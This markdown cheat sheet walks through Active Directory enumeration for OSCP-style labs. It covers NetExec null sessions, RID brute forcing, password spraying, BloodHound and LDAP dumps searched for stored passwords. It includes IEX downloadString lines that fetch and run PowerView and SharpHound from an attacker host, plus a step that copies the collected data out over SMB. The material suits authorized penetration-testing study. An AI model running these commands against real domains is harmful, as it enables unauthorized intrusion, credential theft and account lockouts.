[AD enumeration md 36f15bd2d16c81179704df59bc5b099e.md](https://github.com/user-attachments/files/28387703/AD.enumeration.md.36f15bd2d16c81179704df59bc5b099e.md)

# AD/enumeration.md

# AD Enumeration

> Recommended OSCP flow: NXC no-creds → AS-REP/spray → authenticated NXC + BloodHound → analyze edges → exploit ACLs
> 

---

## PHASE 0 — NXC without credentials (first contact)

```bash
# Subnet sweep — identify AD hosts
nxc smb 192.168.1.0/24
nxc smb targets.txt
# Output: hostname, domain, Windows version, SMB signing ON/OFF

# Null session — check if it's available
nxc smb <DC_IP> -u '' -p ''
nxc smb <DC_IP> -u 'guest' -p ''

# Enumerate shares without credentials
nxc smb <DC_IP> -u '' -p '' --shares

# RID brute — get users without creds
nxc smb <DC_IP> -u '' -p '' --rid-brute
nxc smb <DC_IP> -u 'guest' -p '' --rid-brute 10000

# Password policy — ALWAYS check before spraying to avoid lockouts
nxc smb <DC_IP> -u '' -p '' --pass-pol

# Anonymous LDAP
nxc ldap <DC_IP> -u '' -p '' --users
```

```bash
# SMB Signing — critical for relay attacks
# Writes relay_targets.txt with all hosts WITHOUT forced SMB signing
nxc smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
```

```bash
# Check known vulnerabilities without creds
nxc smb <TARGET_IP> -u '' -p '' -M ms17-010      # EternalBlue
nxc smb <TARGET_IP> -u '' -p '' -M printnightmare
nxc smb <DC_IP>     -u '' -p '' -M zerologon      # only check, do NOT exploit
```

---

## PHASE 2 — Authenticated NXC + BloodHound

Once you have valid credentials (even a low-priv user), run full enumeration:

```bash
# BloodHound from NXC (the easiest way)
nxc ldap <DC_IP> -u <user> -p '<pass>' --bloodhound -c All --dns-server <DC_IP>
nxc ldap <DC_IP> -u <user> -p '<pass>' --bloodhound -c DCOnly   # faster

# Direct alternative
bloodhound-python -u <user> -p '<pass>' -d <domain> -ns <DC_IP> -c All --zip
```

```bash
# Users and groups
nxc ldap <DC_IP> -u <user> -p '<pass>' --users
nxc ldap <DC_IP> -u <user> -p '<pass>' --groups
nxc ldap <DC_IP> -u <user> -p '<pass>' -M user-desc          # passwords in description field
nxc ldap <DC_IP> -u <user> -p '<pass>' --admin-count         # users with adminCount=1

# Shares and interesting files
nxc smb <DC_IP> -u <user> -p '<pass>' --shares
nxc smb <DC_IP> -u <user> -p '<pass>' -M spider_plus
nxc smb <DC_IP> -u <user> -p '<pass>' -M spider_plus -o DOWNLOAD_FLAG=True

# Delegations and ADCS
nxc ldap <DC_IP> -u <user> -p '<pass>' --trusted-for-delegation
nxc ldap <DC_IP> -u <user> -p '<pass>' -M adcs
nxc ldap <DC_IP> -u <user> -p '<pass>' -M laps
nxc ldap <DC_IP> -u <user> -p '<pass>' -M ldap-checker       # LDAP signing disabled
nxc ldap <DC_IP> -u <user> -p '<pass>' --gmsa                # gMSA accounts

# Where are you local admin on the network
nxc smb 192.168.1.0/24 -u <user> -p '<pass>'                 # (Pwn3d!) = local admin
nxc winrm 192.168.1.0/24 -u <user> -p '<pass>'
nxc smb <TARGET_IP> -u <user> -p '<pass>' --loggedon-users   # hunt for DA sessions
```

```bash
# Useful manual LDAP queries
# Users with DONT_REQ_PREAUTH (ASREProastable)
nxc ldap <DC_IP> -u <user> -p '<pass>' --query "(userAccountControl:1.2.840.113556.1.4.883:=4194304)" "samaccountname"

# Users with SPN (Kerberoastable)
nxc ldap <DC_IP> -u <user> -p '<pass>' --query "(&(samAccountType=805306368)(servicePrincipalName=*))" "samaccountname,servicePrincipalName"

# Read ACLs on an object (daclread module)
nxc ldap <DC_IP> -u <user> -p '<pass>' -M daclread -o TARGET=<samAccountName> RIGHTS='*'
```

---

> Classic flow (individual tools): DNS → anonymous LDAP → anonymous SMB → RPC → (with creds) ldapdomaindump + BloodHound
> 

## Without Credentials

### DNS — DC subdomains

```bash
dig @<DC-IP> <domain.local>
dig axfr @<DC-IP> <domain.local>

# Real example (Blackfield HTB)
dig @10.10.10.192 blackfield.local
dig axfr @10.10.10.192 blackfield.local
dig @10.10.10.192 ForestDnsZones.BLACKFIELD.local
```

### Kerbrute — Validate users without credentials

```bash
# Enumerate valid users (very quiet)
kerbrute userenum --dc <DC-IP> -d <domain.local> userlist.txt

# Password spray
kerbrute passwordspray --dc <DC-IP> -d <domain.local> users.txt 'Password123'
```

⚠️ Generates 4768 events on the DC. More quiet than other methods but not invisible.

### Anonymous LDAP (Port 389)

```bash
# Naming contexts (check if anonymous bind works)
ldapsearch -h <IP> -x -s base namingcontexts

# Full anonymous dump
ldapsearch -h <IP> -x -b "DC=<domain>,DC=local"

# Find AS-REP Roastable users
ldapsearch -x -H ldap://<IP> -b "DC=<domain>,DC=local" \
  '(objectclass=user)' sAMAccountName userAccountControl
# userAccountControl = 4194304 → AS-REP Roastable

# List sAMAccountName + description (sometimes passwords are stored there)
ldapsearch -x -H ldap://10.129.96.155 -b "dc=megabank,dc=local" \
  "(objectClass=user)" sAMAccountName description
```

### LDAP — Filter sensitive content from the dump

```bash
# Save full dump
ldapsearch -x -H ldap://<IP> -b "DC=<domain>,DC=local" > ldap_full.txt

# Search for passwords in various fields
grep -iE "pass|pwd|password|secret" ldap_full.txt -B 2 -A 2

# Search for GPP cpassword (group policy passwords)
grep -i "cpassword" ldap_full.txt

# Search for useful comments or notes
grep -iE "description:|info:|comment:" ldap_full.txt
```

💡 The `description` and `info` fields are goldmines in real environments — admins who put passwords there "temporarily".

### Anonymous SMB (Port 445)

```bash
# List shares
smbclient -N -L //<IP>
smbmap -H <IP> -u null

# Access anonymous share
smbclient -N //<IP>/<share>

# Inside the share — download everything recursively
RECURSE ON
PROMPT OFF
mget *
```

💡 **SYSVOL and Replication** are usually accessible anonymously → look for XML files with cPasswords.

### Anonymous RPC (Port 135)

```bash
# Try null session
rpcclient -U "" <IP> -N

# Inside rpcclient:
enumdomusers          # List users
enumdomgroups         # List groups
```

### enum4linux-ng — All-in-one enumeration (modern)

```bash
# Modern successor of enum4linux — more reliable, has JSON output
pip3 install enum4linux-ng

# Full anonymous enumeration
enum4linux-ng -A <IP>

# With credentials
enum4linux-ng -A <IP> -u '<user>' -p '<password>'

# JSON output (easier to parse)
enum4linux-ng -A <IP> -oJ results.json
```

💡 Covers: users, groups, shares, password policies, OS info, and active sessions. Faster than doing it manually.

### windapsearch — Structured LDAP queries

```bash
# Install
git clone https://github.com/ropnop/windapsearch.git
pip3 install python-ldap

# Enumerate users (with credentials)
python3 windapsearch.py -d <domain.local> -u '<user>@<domain.local>' -p '<password>' -U

# Find DA users
python3 windapsearch.py -d <domain.local> -u '<user>@<domain.local>' -p '<password>' --da

# Domain computers
python3 windapsearch.py -d <domain.local> -u '<user>@<domain.local>' -p '<password>' -C

# Groups
python3 windapsearch.py -d <domain.local> -u '<user>@<domain.local>' -p '<password>' -G

# Users with Unconstrained Delegation
python3 windapsearch.py -d <domain.local> -u '<user>@<domain.local>' -p '<password>' --unconstrained-users
```

### Certipy — Enumerate ADCS (Certificate Services)

```bash
# Install
pip3 install certipy-ad

# Enumerate the full certificate infrastructure
certipy find -u '<user>@<domain.local>' -p '<password>' -dc-ip <DC-IP>

# Generate BloodHound-compatible output
certipy find -u '<user>@<domain.local>' -p '<password>' -dc-ip <DC-IP> -bloodhound

# Show only vulnerable templates
certipy find -u '<user>@<domain.local>' -p '<password>' -dc-ip <DC-IP> -vulnerable
```

**What Certipy looks for:**

- Templates with Client Authentication + Enrollee Supplies Subject → ESC1
- Web Enrollment active → ESC8
- Misconfigured enroll permissions → ESC4/ESC7

💡 If there's ADCS in the environment, `certipy find -vulnerable` is mandatory. Many HTB AD machines have ESC1 or ESC8.

---

## With Credentials

### CrackMapExec / NetExec (nxc) — Validate and enumerate

```bash
# Validate credentials
crackmapexec smb <IP> -u <user> -p '<password>'
crackmapexec winrm <IP> -u <user> -p '<password>'

# Enumerate
crackmapexec smb <IP> -u <user> -p '<password>' --users
crackmapexec smb <IP> -u <user> -p '<password>' --groups
crackmapexec smb <IP> -u <user> -p '<password>' --shares

# Full network sweep
crackmapexec smb <IP>/24 -u <user> -p '<password>'
```

### NXC — Password spray with user list

```bash
# Try one password against multiple users (e.g. after finding it in LDAP/SMB)
nxc smb <IP> -u users.txt -p 'Welcome123!' --continue-on-success

# Without --continue-on-success it stops at the first hit — always use it

# Real example (HTB Resolute):
nxc smb 10.129.96.155 -u users1.txt -p 'Welcome123!' --continue-on-success
```

⚠️ Without `--continue-on-success` the spray stops at the first valid user. Always use it.

### NXC — Change expired password (PASSWORD_MUST_CHANGE)

```bash
# When login returns STATUS_PASSWORD_MUST_CHANGE or STATUS_PASSWORD_EXPIRED
nxc smb <IP> -u <user> -p '<oldpass>' -M change-password -o NEWPASS='<newpass>'

# Real example (HTB Fuse — fabricorp.local):
nxc smb 10.129.2.5 -u bnielson -p 'Fabricorp01' -M change-password -o NEWPASS='OSCP.Pwned.2026.!!!'
```

💡 Heads up: short TTL passwords expire fast. If SMB returns an error after changing it → change it again. HTB Fuse does this with multiple users.

### ldapdomaindump — Visual domain dump

```bash
sudo ldapdomaindump ldaps://<DC-IP> -u 'DOMAIN\<user>' -p '<password>'

# View in Firefox
service apache2 start
# Open: http://localhost
```

Shows: domain admins, users, groups, GPOs, computers — all organized.

### BloodHound — Full domain map

```bash
# Install
sudo pip install bloodhound
sudo apt install neo4j bloodhound -y

# Start neo4j
sudo neo4j console
# → http://localhost:7474 → neo4j:neo4j → change password

# Collect data from Kali
bloodhound-python -c ALL -u '<user>' -p '<password>' -ns <DC-IP> -d <domain.local>

# Upload generated JSONs → BloodHound → Upload Data
# Key queries:
# → Shortest Paths to Domain Admins
# → Find AS-REP Roastable Users
# → Find Kerberoastable Users
# → Find ACL Abuses
```

**From a compromised machine:**

```powershell
# Download SharpHound
IEX(New-Object Net.WebClient).downloadString('http://<YOUR-IP>/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All

# Send ZIP to Kali via SMB
impacket-smbserver smbFolder $(pwd) -smb2support -username user -password pass
net use x: \\<KALI-IP>\smbFolder /user:user pass
copy <BloodHound.zip> x:\
```

### rpcclient with credentials

```bash
rpcclient -U "<user>%<password>" <IP>

# Inside:
enumdomusers
enumdomgroups
querygroupmem <RID>    # View members of a group
queryuser <RID>        # User info
```

💡 With `querygroupmem` on Domain Admins → get RIDs of admins → `queryuser` to see details.

### rpcclient — Full list of useful commands

```bash
# Domain info
querydominfo           # Domain info (name, SID)
srvinfo               # Server info (OS, version)

# Enumeration
enumdomusers          # Domain users (with RID)
enumdomgroups         # Domain groups
querygroupmem "Domain Admins"  # Members of a group (by name)
queryuser <RID>       # Detailed user info

# SID <-> name mapping
lookupsids <username>         # Name → SID
lookupnames <SID>             # SID → Account name

# Resources and services
netshareenum                  # List shares
netsharegetinfo <sharename>   # Details of a share
enumprinters                  # Shared printers

# Security policies
lsaquery                      # Password and lockout policies
enumprivs                     # Account privileges

# Administration (requires permissions)
addusertogroup <user> <group>
deluserfromgroup <user> <group>
createdomuser <user> <pass>   # Create user (DA required)
```

💡 `lookupsids` and `lookupnames` are useful when you have RIDs from enumdomusers but need to resolve them to names.

```bash
# Extract users from output.txt (rpcclient format)
cat output.txt | awk -F'[][]' '{print $2}' > users.txt
cat output.txt | awk -F'[][]' '{print $2}' > groups.txt

# Clean users — exclude built-in accounts before attacking
# (avoids lockouts from hitting system accounts that aren't worth it)
grep -oP 'user:\[\K[^\]]+' output.txt | grep -vE 'Administrator|Guest|krbtgt|DefaultAccount' > clean_users.txt
```

⚠️ Always filter built-in accounts before sprays — locking them out creates noise and gives nothing.

### PowerView — Advanced enumeration from Windows

```powershell
# Load from memory
IEX(New-Object Net.WebClient).downloadString('http://<IP>/PowerView.ps1')

# Users
Get-DomainUser -SPN                    # Kerberoastable
Get-DomainUser -PreauthNotRequired     # AS-REP Roastable

# Groups
Get-DomainGroupMember "Domain Admins"

# Dangerous ACLs
Find-InterestingDomainAcl -ResolveGUIDs

# Computers with Unconstrained Delegation
Get-DomainComputer -Unconstrained | select name
```
